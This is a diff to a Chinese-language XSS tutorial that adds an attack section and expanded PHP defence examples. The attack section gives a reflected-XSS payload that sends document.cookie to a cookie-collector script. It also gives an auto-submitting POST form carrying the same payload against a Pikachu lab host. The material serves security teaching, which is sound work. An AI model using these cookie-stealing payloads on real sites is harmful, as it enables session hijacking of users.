@@ -1,6 +1,7 @@
 - [XSS攻击如何产生？](#xss攻击如何产生)
 - [主要类型以及原理？](#主要类型以及原理)
 - [XSS危害](#xss危害)
+- [利用XSS进行攻击活动](#利用xss进行攻击活动)
 - [如何防护](#如何防护)
 
 
@@ -50,11 +51,131 @@ XSS漏洞的核心就是，网页执行了构造的恶意脚本。至于如何�
 - 利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。
 - 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。
 
+## 利用XSS进行攻击活动
+攻击payload的制作分两种类型：
+- **Get型 ** 
+  构造恶意链接中带有参数
+
+>eg:`http://**.**.**/pikachu/vul/xss/xss_reflected_get.php?message=test&submit=submit`
+>
+>message的内容会在页面上显示，所以可以在message参数值中构造js语句执行一些恶意操作
+>
+>eg:`<script>document.location = 'http://**.**.**/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>`   盗取cookie值
+
+
+- **Post型 ** 
+需要构造一个页面，页面中包含表单，提交表单数据形成post请求
+
+页面中包含一个表单，表单的请求地址是存在XSS漏洞的页面地址。
+post提交的内容是恶意内容，value值。
+表单请求执行结果返回到xss_reflected_post.php，触发执行value中的内容。
+
+```html
+<html> 
+  <head> 
+    <script>window.onload = function() {  document.getElementById("postsubmit").click();}</script> 
+  </head> 
+  <body> 
+    <form method="post" action="http://10.201.164.32/pikachu/vul/xss/xsspost/xss_reflected_post.php">     
+      <input id="xssr_in" type="text" name="message" value="<script>document.location = 'http://10.201.164.32/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;  </script>"/>     
+      <input id="postsubmit" type="submit" name="submit" value="submit" /> 
+    </form> 
+  </body> 
+</html>
+```
+
+
+
 ## 如何防护
+根据恶意内容在浏览器上显示的位置不同划分：
+
+1. html普通标签位置输出
+   
+   将内容输出到`<div> <p> `等html中常见的标签中，当作标签的内容显示。
+  -->直接使用htmlspecialchars实体编码即可
+   eg:
+      ```php
+      $div=$_GET['div'];
+      //解决方法：
+      // $div .= htmlspecialchars($_GET['div'],ENT_QUOTES);  
+      <div>
+        <?php echo $div;?>
+      <div>
+      ```
+   
+   
+
+2. 普通标签的普通属性
+   
+   如输出到input的value属性值
+  -->直接使用htmlspecialchars实体编码即可
+   ```php
+    $msg .= $_GET['msg'];
+      //    防范措施:html实体编码
+      //    $msg .= htmlspecialchars($_GET['msg'],ENT_QUOTES);
+    <form>
+      <input name="msg" value="<?php echo $msg;?>">
+    </form>
+   ```
+
+3. 输出在事件属性中
+
+  输出位置在标签的事件属性中，如onmouseover
+  -->
+  ```php
+
+    <form>
+      <input type="button" value="submit" onmouseover="init('<?php echo $in;?>')">
+    </form>
+  ```
+
+4. 输出在特殊的属性中
+
+  如a标签的href属性
+  --> 按输入的内容的合法格式进行正则匹配，检查是否是url，再进行html实体编码
+
+  a标签中href属性支持javascript:伪代码执行
+  
+  ```php
+  function check_url($url){
+    if (preg_match('/\Ahttp:/',$url) || preg_match('/\Ahttps:/',$url) || preg_match('#\A/#',$url)){
+        return true;
+    }else{
+        return false;
+    }
+  }
+  if (isset($_GET['url'])){
+    $url .= htmlspecialchars($_GET['url'],ENT_QUOTES);
+  }
+
+  ```
+
+5. 输出点在js中
+
+  输出内容在一段js代码中
+  -->转义函数:所有的字符串,除字母,数字,.号,-号外的其他全部进行转义为unicode(utf-8是unicode的一种实现),unicode可以在js中可以被正常解析使用,所有的转义操作在后台进行后输出到前台。
+    注意：js本身不解析html实体字符
+  
+  ```php
+  //转换字符的编码
+  function unicode_escape($str){
+      $u16 = mb_convert_encoding($str[0],'UTF-16');
+      return preg_replace('/[0-9a-f]{4}/','\u$0',bin2hex($u16));
+  }
+  //将字母和数字还有.-排除后的剩下的字符全部\uXXXX的unicode的形式进行转义
+  //搜索一个正则,并使用指定的回调函数进行callback
+  function escape_js_string($input){
+      return preg_replace_callback('/[^-\.0-9a-zA-Z]+/u','unicode_escape',$input);
+  }
+
+  
+  ```
+
 
 总体思路:对用户输入进行过滤,对输出进行编码;
 
 1. 对用户输入进行XSS防御方式有2种:
+   
    基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全;
    
    黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 '  "   <> 等进行过滤
@@ -71,6 +192,7 @@ XSS漏洞的核心就是，网页执行了构造的恶意脚本。至于如何�
    
     Step3：在该Cookie到期前，浏览器访问该域下的所有页面，都将发送该Cookie。
     HTTPOnly是在Set-Cookie时被标记的。服务器可能会设置多个Cookie（多个key-value对），而HttpOnly可以有选择性地加在任何一个Cookie值上。在某些时候，应用可能需要JavaScript访问某几项Cookie，这种Cookie可以不设置HttpOnly标记；而仅把HttpOnly标记给用于认证的关键Cookie。
+
 3. 使用一些函数进行防御
 
   * htmlspecialchars()：将输入内容转换成HTML实体
